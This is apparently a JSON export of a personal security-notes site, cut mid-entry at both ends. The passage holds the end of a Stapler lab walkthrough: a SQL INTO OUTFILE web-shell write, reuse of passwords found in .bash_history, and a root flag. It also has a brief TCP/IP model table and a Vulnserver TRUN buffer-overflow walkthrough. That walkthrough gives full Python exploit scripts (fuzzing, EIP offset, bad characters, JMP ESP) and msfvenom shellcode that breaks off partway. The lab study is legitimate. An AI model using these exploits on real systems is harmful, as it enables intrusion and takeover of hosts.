endif; ?\u0026gt; ' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php'  wordpress admin upload shell as a \u0026lsquo;plugin\u0026rsquo;\nPost Exploit ssh - SHayslett@red SHayslett@red:~$ ls -la total 28 drwxr-xr-x 3 SHayslett SHayslett 4096 Jan 6 20:58 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 SHayslett SHayslett 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 SHayslett SHayslett 3771 Sep 1 2015 .bashrc drwx------ 2 SHayslett SHayslett 4096 Jan 6 20:58 .cache -rw-r--r-- 1 SHayslett SHayslett 675 Sep 1 2015 .profile SHayslett@red:~$ sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for SHayslett: Sorry, user SHayslett may not run sudo on red. SHayslett@red:~$ su elly Password: ylle elly@red:/home/SHayslett$ sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for elly: ylle Sorry, user elly may not run sudo on red. elly@red:/home/SHayslett$ exit SHayslett@red:~$ su JBare Password: incorrect su: Authentication failure SHayslett@red:~$ su JKanode Password: incorrect su: Authentication failure SHayslett@red:~$ su JLipps Password: incorrect su: Authentication failure SHayslett@red:~$ su root Password: plbkac su: Authentication failure SHayslett@red:/home$ ls -la -R .: total 128 drwxr-xr-x 32 root root 4096 Jun 4 2016 . drwxr-xr-x 22 root root 4096 Jun 7 2016 .. drwxr-xr-x 2 AParnell AParnell 4096 Jun 5 2016 AParnell drwxr-xr-x 2 CCeaser CCeaser 4096 Jun 5 2016 CCeaser drwxr-xr-x 2 CJoo CJoo 4096 Jun 5 2016 CJoo drwxr-xr-x 2 Drew Drew 4096 Jun 5 2016 Drew drwxr-xr-x 2 DSwanger DSwanger 4096 Jun 5 2016 DSwanger drwxr-xr-x 2 Eeth Eeth 4096 Jun 5 2016 Eeth drwxr-xr-x 2 elly elly 4096 Jun 5 2016 elly drwxr-xr-x 2 ETollefson ETollefson 4096 Jun 5 2016 ETollefson drwxr-xr-x 2 IChadwick IChadwick 4096 Jun 5 2016 IChadwick drwxr-xr-x 2 jamie jamie 4096 Jun 5 2016 jamie drwxr-xr-x 2 JBare JBare 4096 Jun 5 2016 JBare drwxr-xr-x 2 jess jess 4096 Jun 5 2016 jess drwxr-xr-x 2 JKanode JKanode 4096 Jun 5 2016 JKanode drwxr-xr-x 2 JLipps JLipps 4096 Jun 5 2016 JLipps drwxr-xr-x 2 kai kai 4096 Jun 5 2016 kai drwxr-xr-x 2 LSolum LSolum 4096 Jun 5 2016 LSolum drwxr-xr-x 2 LSolum2 LSolum2 4096 Jun 5 2016 LSolum2 drwxr-xr-x 2 MBassin MBassin 4096 Jun 5 2016 MBassin drwxr-xr-x 2 mel mel 4096 Jun 5 2016 mel drwxr-xr-x 2 MFrei MFrei 4096 Jun 5 2016 MFrei drwxr-xr-x 2 NATHAN NATHAN 4096 Jun 5 2016 NATHAN drwxr-xr-x 3 peter peter 4096 Jun 3 2016 peter drwxr-xr-x 2 RNunemaker RNunemaker 4096 Jun 5 2016 RNunemaker drwxr-xr-x 2 Sam Sam 4096 Jun 5 2016 Sam drwxr-xr-x 2 SHAY SHAY 4096 Jun 5 2016 SHAY drwxr-xr-x 3 SHayslett SHayslett 4096 Jan 6 20:58 SHayslett drwxr-xr-x 2 SStroud SStroud 4096 Jun 5 2016 SStroud drwxr-xr-x 2 Taylor Taylor 4096 Jun 5 2016 Taylor drwxrwxrwx 2 www www 4096 Jun 5 2016 www drwxr-xr-x 2 zoe zoe 4096 Jun 5 2016 zoe ./AParnell: total 24 drwxr-xr-x 2 AParnell AParnell 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 AParnell AParnell 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 AParnell AParnell 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 AParnell AParnell 675 Sep 1 2015 .profile ./CCeaser: total 24 drwxr-xr-x 2 CCeaser CCeaser 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 10 Jun 5 2016 .bash_history -rw-r--r-- 1 CCeaser CCeaser 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 CCeaser CCeaser 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 CCeaser CCeaser 675 Sep 1 2015 .profile ./CJoo: total 24 drwxr-xr-x 2 CJoo CJoo 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 CJoo CJoo 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 CJoo CJoo 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 CJoo CJoo 675 Sep 1 2015 .profile ./Drew: total 24 drwxr-xr-x 2 Drew Drew 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 Drew Drew 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 Drew Drew 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 Drew Drew 675 Sep 1 2015 .profile ./DSwanger: total 24 drwxr-xr-x 2 DSwanger DSwanger 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 DSwanger DSwanger 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 DSwanger DSwanger 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 DSwanger DSwanger 675 Sep 1 2015 .profile ./Eeth: total 24 drwxr-xr-x 2 Eeth Eeth 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 Eeth Eeth 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 Eeth Eeth 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 Eeth Eeth 675 Sep 1 2015 .profile ./elly: total 24 drwxr-xr-x 2 elly elly 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 elly elly 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 elly elly 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 elly elly 675 Sep 1 2015 .profile ./ETollefson: total 24 drwxr-xr-x 2 ETollefson ETollefson 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 ETollefson ETollefson 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 ETollefson ETollefson 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 ETollefson ETollefson 675 Sep 1 2015 .profile ./IChadwick: total 24 drwxr-xr-x 2 IChadwick IChadwick 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 IChadwick IChadwick 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 IChadwick IChadwick 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 IChadwick IChadwick 675 Sep 1 2015 .profile ./jamie: total 24 drwxr-xr-x 2 jamie jamie 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 16 Jun 5 2016 .bash_history -rw-r--r-- 1 jamie jamie 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 jamie jamie 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 jamie jamie 675 Sep 1 2015 .profile ./JBare: total 24 drwxr-xr-x 2 JBare JBare 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 JBare JBare 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 JBare JBare 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 JBare JBare 675 Sep 1 2015 .profile ./jess: total 24 drwxr-xr-x 2 jess jess 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 jess jess 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 jess jess 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 jess jess 675 Sep 1 2015 .profile ./JKanode: total 24 drwxr-xr-x 2 JKanode JKanode 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 JKanode JKanode 167 Jun 5 2016 .bash_history -rw-r--r-- 1 JKanode JKanode 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 JKanode JKanode 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 JKanode JKanode 675 Sep 1 2015 .profile ./JLipps: total 24 drwxr-xr-x 2 JLipps JLipps 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 10 Jun 5 2016 .bash_history -rw-r--r-- 1 JLipps JLipps 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 JLipps JLipps 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 JLipps JLipps 675 Sep 1 2015 .profile ./kai: total 24 drwxr-xr-x 2 kai kai 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 kai kai 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 kai kai 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 kai kai 675 Sep 1 2015 .profile ./LSolum: total 24 drwxr-xr-x 2 LSolum LSolum 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 LSolum LSolum 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 LSolum LSolum 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 LSolum LSolum 675 Sep 1 2015 .profile ./LSolum2: total 24 drwxr-xr-x 2 LSolum2 LSolum2 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 12 Jun 5 2016 .bash_history -rw-r--r-- 1 LSolum2 LSolum2 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 LSolum2 LSolum2 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 LSolum2 LSolum2 675 Sep 1 2015 .profile ./MBassin: total 24 drwxr-xr-x 2 MBassin MBassin 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 MBassin MBassin 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 MBassin MBassin 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 MBassin MBassin 675 Sep 1 2015 .profile ./mel: total 24 drwxr-xr-x 2 mel mel 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 mel mel 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 mel mel 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 mel mel 675 Sep 1 2015 .profile ./MFrei: total 24 drwxr-xr-x 2 MFrei MFrei 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 MFrei MFrei 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 MFrei MFrei 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 MFrei MFrei 675 Sep 1 2015 .profile ./NATHAN: total 24 drwxr-xr-x 2 NATHAN NATHAN 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 NATHAN NATHAN 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 NATHAN NATHAN 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 NATHAN NATHAN 675 Sep 1 2015 .profile ./peter: total 72 drwxr-xr-x 3 peter peter 4096 Jun 3 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw------- 1 peter peter 1 Jun 5 2016 .bash_history -rw-r--r-- 1 peter peter 220 Jun 3 2016 .bash_logout -rw-r--r-- 1 peter peter 3771 Jun 3 2016 .bashrc drwx------ 2 peter peter 4096 Jun 6 2016 .cache -rw-r--r-- 1 peter peter 675 Jun 3 2016 .profile -rw-r--r-- 1 peter peter 0 Jun 3 2016 .sudo_as_admin_successful -rw------- 1 peter peter 577 Jun 3 2016 .viminfo -rw-rw-r-- 1 peter peter 39206 Jun 3 2016 .zcompdump ls: cannot open directory './peter/.cache': Permission denied ./RNunemaker: total 24 drwxr-xr-x 2 RNunemaker RNunemaker 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 RNunemaker RNunemaker 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 RNunemaker RNunemaker 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 RNunemaker RNunemaker 675 Sep 1 2015 .profile ./Sam: total 24 drwxr-xr-x 2 Sam Sam 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 Sam Sam 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 Sam Sam 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 Sam Sam 675 Sep 1 2015 .profile ./SHAY: total 24 drwxr-xr-x 2 SHAY SHAY 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 SHAY SHAY 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 SHAY SHAY 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 SHAY SHAY 675 Sep 1 2015 .profile ./SHayslett: total 28 drwxr-xr-x 3 SHayslett SHayslett 4096 Jan 6 20:58 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 SHayslett SHayslett 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 SHayslett SHayslett 3771 Sep 1 2015 .bashrc drwx------ 2 SHayslett SHayslett 4096 Jan 6 20:58 .cache -rw-r--r-- 1 SHayslett SHayslett 675 Sep 1 2015 .profile ./SHayslett/.cache: total 8 drwx------ 2 SHayslett SHayslett 4096 Jan 6 20:58 . drwxr-xr-x 3 SHayslett SHayslett 4096 Jan 6 20:58 .. -rw-r--r-- 1 SHayslett SHayslett 0 Jan 6 20:58 motd.legal-displayed ./SStroud: total 24 drwxr-xr-x 2 SStroud SStroud 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 5 Jun 5 2016 .bash_history -rw-r--r-- 1 SStroud SStroud 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 SStroud SStroud 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 SStroud SStroud 675 Sep 1 2015 .profile ./Taylor: total 24 drwxr-xr-x 2 Taylor Taylor 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 8 Jun 5 2016 .bash_history -rw-r--r-- 1 Taylor Taylor 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 Taylor Taylor 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 Taylor Taylor 675 Sep 1 2015 .profile ./www: total 20 drwxrwxrwx 2 www www 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 www www 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 www www 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 www www 675 Sep 1 2015 .profile ./zoe: total 24 drwxr-xr-x 2 zoe zoe 4096 Jun 5 2016 . drwxr-xr-x 32 root root 4096 Jun 4 2016 .. -rw-r--r-- 1 root root 9 Jun 5 2016 .bash_history -rw-r--r-- 1 zoe zoe 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 zoe zoe 3771 Sep 1 2015 .bashrc -rw-r--r-- 1 zoe zoe 675 Sep 1 2015 .profile SHayslett@red:/home$ netstat -tuln Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:53 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:666 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN tcp6 0 0 :::139 :::* LISTEN tcp6 0 0 :::53 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 :::12380 :::* LISTEN tcp6 0 0 :::12380 :::* LISTEN tcp6 0 0 :::445 :::* LISTEN udp 0 0 192.168.56.255:137 0.0.0.0:* udp 0 0 192.168.56.101:137 0.0.0.0:* udp 0 0 0.0.0.0:137 0.0.0.0:* udp 0 0 192.168.56.255:138 0.0.0.0:* udp 0 0 192.168.56.101:138 0.0.0.0:* udp 0 0 0.0.0.0:138 0.0.0.0:* udp 0 0 0.0.0.0:53 0.0.0.0:* udp 0 0 0.0.0.0:68 0.0.0.0:* udp 0 0 0.0.0.0:69 0.0.0.0:* udp6 0 0 :::53 :::* SHayslett@red:/home$ ps aux | grep 8888 SHaysle+ 1046 0.0 0.0 5108 764 pts/0 S+ 00:35 0:00 grep --color=auto 8888 root 1339 0.0 0.3 6472 3320 ? S Jan06 0:00 su -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 \u0026amp;\u0026gt;/dev/null JKanode JKanode 1363 0.0 0.2 5436 2840 ? Ss Jan06 0:00 bash -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 \u0026amp;\u0026gt;/dev/null JKanode 1364 0.0 0.6 14696 6440 ? S Jan06 0:06 python2 -m SimpleHTTPServer 8888 SHayslett@red:/home/JKanode$ cat .bash_history id whoami ls -lah pwd ps aux sshpass -p thisimypassword ssh JKanode@localhost apt-get install sshpass sshpass -p JZQuyIN5 peter@localhost ps -ef top kill -9 3747 exit SHayslett@red:/home/JKanode$ exit  Priv Esc ssh peter root@kali:~/Desktop# ssh peter@192.168.56.101 ----------------------------------------------------------------- ~ Barry, don't forget to put a message here ~ ----------------------------------------------------------------- peter@192.168.56.101's password: Welcome back! This is the Z Shell configuration function for new users, zsh-newuser-install. You are seeing this message because you have no zsh startup files (the files .zshenv, .zprofile, .zshrc, .zlogin in the directory ~). This function can help you with a few settings that should make your use of the shell easier. You can: (q) Quit and do nothing. The function will be run again next time. (0) Exit, creating the file ~/.zshrc containing just a comment. That will prevent this function being run again. (1) Continue to the main menu. (2) Populate your ~/.zshrc with the configuration recommended by the system administrator and exit (you will need to edit the file by hand, if so desired). --- Type one of the keys in parentheses --- 0 red% sudo -l We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for peter: Matching Defaults entries for peter on red: lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User peter may run the following commands on red: (ALL : ALL) ALL red% root@red:~# cd /root/ root@red:/root# ls -la total 208 drwx------ 4 root root 4096 Jan 6 14:46 . drwxr-xr-x 22 root root 4096 Jun 7 2016 .. -rw------- 1 root root 1 Jun 5 2016 .bash_history -rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc -rwxr-xr-x 1 root root 1090 Jun 5 2016 fix-wordpress.sh -rw-r--r-- 1 root root 463 Jun 5 2016 flag.txt -rw-r--r-- 1 root root 345 Jun 5 2016 issue -rw-r--r-- 1 root root 50 Jun 3 2016 .my.cnf -rw------- 1 root root 1 Jun 5 2016 .mysql_history drwxr-xr-x 11 root root 4096 Jun 3 2016 .oh-my-zsh -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rwxr-xr-x 1 root root 103 Jun 5 2016 python.sh -rw------- 1 root root 1024 Jun 5 2016 .rnd drwxr-xr-x 2 root root 4096 Jun 4 2016 .vim -rw------- 1 root root 1 Jun 5 2016 .viminfo -rw-r--r-- 1 root root 54405 Jun 5 2016 wordpress.sql -rw-r--r-- 1 root root 39206 Jun 3 2016 .zcompdump -rw-r--r-- 1 root root 39352 Jun 3 2016 .zcompdump-red-5.1.1 -rw------- 1 root root 39 Jun 5 2016 .zsh_history -rw-r--r-- 1 root root 2839 Jun 3 2016 .zshrc -rw-r--r-- 1 root root 17 Jun 3 2016 .zsh-update root@red:/root# cat flag.txt ~~~~~~~~~~\u0026lt;(Congratulations)\u0026gt;~~~~~~~~~~ .-'''''-. |'-----'| |-.....-| | | | | _,._ | | __.o` o`\u0026quot;-. | | .-O o `\u0026quot;-.o O )_,._ | | ( o O o )--.-\u0026quot;`O o\u0026quot;-.`'-----'` '--------' ( o O o) `----------` b6b545dc11b7a270f4bad23432190c75162c4a2b  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/tcpip-model/",
	"title": "TCP/IP Model",
	"tags": ["Networking"],
	"description": "TCP/IP model description.",
	"content": "TCP/IP model    Layer Number Layer Name Protocol Protocol Data Unit Addressing     5 Application HTTP, SMB, SMTP, etc Messages n/a   4 Transport TCP/UDP Segment Ports   3 Network IP Datagram IP Address   2 Data Link Ethernet, Wi-Fi Frames MAC Address   1 Physical 10 Base T, 802.11 Bits n/a    "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnserver/trun/",
	"title": "TRUN",
	"tags": ["Vulnserver"],
	"description": "Notes from the TRUN command on the Vulnserver machine.",
	"content": "trun Fuzzing #!/usr/bin/python import socket,sys from time import sleep ## Fuzzing address = '192.168.136.130' port = 9999 offset = 100 while True: try: buffer = b\u0026quot;\u0026quot; # empty byte var buffer += b\u0026quot;A\u0026quot;*offset # junk times offset print(f'[+] Sending buffer: {str(len(buffer))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024)\ts.send(b\u0026quot;TRUN /.:/%s \\r\\n\u0026quot; % buffer) offset += 100 sleep(1) except RuntimeError as Err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  root@kali:/mnt/hgfs/_shared_folder/BO python3 trun_1.py [+] Sending buffer: 109 bytes [+] Sending buffer: 209 bytes [+] Sending buffer: 309 bytes [+] Sending buffer: 409 bytes [+] Sending buffer: 509 bytes [+] Sending buffer: 609 bytes [+] Sending buffer: 709 bytes [+] Sending buffer: 809 bytes [+] Sending buffer: 909 bytes [+] Sending buffer: 1009 bytes [+] Sending buffer: 1109 bytes [+] Sending buffer: 1209 bytes [+] Sending buffer: 1309 bytes [+] Sending buffer: 1409 bytes [+] Sending buffer: 1509 bytes [+] Sending buffer: 1609 bytes [+] Sending buffer: 1709 bytes [+] Sending buffer: 1809 bytes [+] Sending buffer: 1909 bytes [+] Sending buffer: 2009 bytes [+] Sending buffer: 2109 bytes [!] Unable to connect to the application.  Find EIP Offset root@kali:/mnt/hgfs/_shared_folder/BO# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200  #!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 #offset = around 2100 pattern = b\u0026quot;Aa0Aa1Aa...Cv0Cv1Cv2C\u0026quot; # Snipped output of pattern_create.rb buff = b\u0026quot;\u0026quot; # empty byte var buff = b\u0026quot;%s\u0026quot; % pattern # add pattern to buff try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024)\ts.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as Err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  EIP value: 386f4337 (8oC7)\nroot@kali:/mnt/hgfs/_shared_folder/BO /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386f4337 [*] Exact match at offset 2003  Controlling the ESP #!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 offset = 2003 buff = b\u0026quot;\u0026quot; # empty byte var buff += b'A'*offset # junk buff += b'B'*4 # EIP buff += b'C'*256 # some more junk on stack after EIP which we want to eventually store our shellcode and jump to. buff += b'D'*256 # this also gives us an idea of how much space we have on the stack. buff += b'E'*128 # buff += b'F'*128 # buff += b'G'*64 # buff += b'H'*64 # buff += b'I'*32 # buff += b'J'*32 # print(buff) try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024)\ts.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application.') sys.exit(0) finally: s.close()  Finding Bad Characters #!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 command = b'TRUN /.:/' offset = 2003 bad_chars = [0x00] chars = b\u0026quot;\u0026quot; for i in range(0x00,0xFF+1): if i not in bad_chars: chars += bytes([i]) buff = b\u0026quot;\u0026quot; # empty byte var buff += b\u0026quot;A\u0026quot;*offset # junk buff += b\u0026quot;B\u0026quot;*4 # EIP buff += b\u0026quot;\u0026quot; + chars # test for chars try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024)\ts.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  no bad chars\nFind JMP ESP !mona modules\nessfunc.dll\nroot@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm \u0026gt; JMP ESP 00000000 FFE4 jmp esp nasm \u0026gt;  !mona find -s \u0026quot;\\xFF\\xE4\u0026quot; -m essfunc.dll\n625011af\n#!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 offset = 2003 shellcode = b\u0026quot;C\u0026quot;*256 buff = b\u0026quot;\u0026quot; # empty byte var buff += b\u0026quot;A\u0026quot;*offset # junk buff += b\u0026quot;\\xAF\\x11\\x50\\x62\u0026quot; # EIP to JMP ESP buff += b'C'*256 # some more junk on stack after EIP which we want to eventually store our shellcode and jump to. buff += b'D'*256 # this also gives us an idea of how much space we have on the stack. buff += b'E'*128 # buff += b'F'*128 # buff += b'G'*64 # buff += b'H'*64 # buff += b'I'*32 # buff += b'J'*32 # try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024)\ts.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  Generate Shellcode root@kali:/mnt/hgfs/_shared_folder/BO# msfvenom -p windows/exec CMD=calc.exe -b '\\x00\\' -f c [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 220 (iteration=0) x86/shikata_ga_nai chosen with final size 220 Payload size: 220 bytes Final size of c file: 949 bytes unsigned char buf[] = \u0026quot;\\xbb\\xbb\\x2a\\xfd\\xc1\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5d\\x33\\xc9\\xb1\u0026quot; \u0026quot;\\x31\\x83\\xed\\xfc\\x31\\x5d\\x0f\\x03\\x5d\\xb4\\xc8\\x08\\x3d\\x22\\x8e\u0026quot; \u0026quot;\\xf3\\xbe\\xb2\\xef\\x7a\\x5b\\x83\\x2f\\x18\\x2f\\xb3\\x9f\\x6a\\x7d\\x3f\u0026quot; \u0026quot;\\x6b\\x3e\\x96\\xb4\\x19\\x97\\x99\\x7d\\x97\\xc1\\x94\\x7e\\x84\\x32\\xb6\u0026quot; \u0026quot;\\xfc\\xd7\\x66\\x18\\x3d\\x18\\x7b\\x59\\x7a\\x45\\x76\\x0b\\xd3\\x01\\x25\u0026quot; \u0026quot;\\xbc\\x50\\x5f\\xf6\\x37\\x2a\\x71\\x7e\\xab\\xfa\\x70\\xaf\\x7a\\x71\\x2b\u0026quot; \u0026quot;\\x6f\\x7c\\x56\\x47\\x26\\x66\\xbb\\x62\\xf0\\x1d\\x0f\\x18\\x03\\xf4\\x5e\u0026quot; 